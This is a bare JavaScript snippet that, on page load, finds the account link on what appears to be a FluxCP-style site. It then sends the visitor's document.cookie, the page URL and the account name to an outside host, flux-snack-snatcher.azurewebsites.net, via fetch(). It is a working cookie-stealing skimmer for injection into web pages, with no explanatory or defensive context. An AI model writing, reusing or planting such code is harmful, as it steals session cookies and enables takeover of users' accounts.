function a() {
    document.addEventListener('DOMContentLoaded', function () {
        var contaLinkElement = document.querySelector('a[href="/?module=account&action=view"][style="text-decoration:underline;"]');

        if (contaLinkElement) {
            var contaLink = contaLinkElement.textContent || contaLinkElement.innerText;

            var url = 'https://flux-snack-snatcher.azurewebsites.net/snatch?snacks=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(document.URL) + '&contaLink=' + encodeURIComponent(contaLink);

            fetch(url);
        }
    });
}
